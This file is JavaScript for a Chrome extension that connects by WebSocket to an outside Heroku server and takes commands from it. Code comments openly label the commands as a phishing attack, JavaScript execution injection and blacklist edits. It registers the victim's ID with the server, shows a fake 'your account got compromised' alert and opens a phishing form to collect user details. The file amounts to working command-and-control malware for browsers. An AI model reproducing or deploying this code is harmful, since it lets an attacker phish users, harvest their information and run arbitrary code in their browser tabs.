//The server we are connecting to.
var HOST = 'wss://projectnickname123.herokuapp.com';
var ws = new WebSocket(HOST);

//Variables we are using to listen to the server.
var object = "";
var type = "";
var temp = "hello";
var translateString = 'alert("Hello!")';

//Listen to the server and parse objects.
ws.onmessage = function (e) {
    console.log("Message received!");
    object = JSON.parse(e.data);
    type = object.type;
  //  temp = object.addString;
  //  translateString = object.jsString;

    switch(type){
      //Phishing attack
      case 'html':
        chrome.tabs.query({active: true, currentWindow: true}, function(tab){
          chrome.tabs.sendMessage(tab[0].id, {action: 'phis'});
        });
        break;
      case 'js':
      //JS exe injection
        chrome.tabs.query({active: true, currentWindow: true}, function(tab){
          chrome.tabs.sendMessage(tab[0].id, {action: 'exe'});
        });
        chrome.storage.sync.set({'scriptExe': translateString}, function(){});
        break;
      case 'listAdd':
      //Add to the list of blacklist websites.
        chrome.tabs.query({active: true, currentWindow: true}, function(tab){
          chrome.tabs.sendMessage(tab[0].id, {action: 'addL'});
        });
        chrome.storage.sync.set({'addSite': temp}, function(){});
        break;
    }
};

/*
This function is just meant to redirect users to the phish form for now, when
the content scripts runs a message. THIS FILE WILL BE USED FOR LISTENING TO
SERVER SIGNALS.
*/

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse){
  switch(request.action){
    case 'load':
      alert("Your account got comprimised. We need additional information to continue display of this accounts' info.");
      chrome.tabs.create({url: '/phishForm.html', active: true});
      break;
  }
});

ws.onopen = function(event){
  chrome.storage.sync.get("id", function(ev){
    var id=ev.id;
    var jsonPackage = {id: id, type: 'online'};
    alert("INSIDE OF READY STATE!");
    ws.send(JSON.stringify(jsonPackage));
  });
}
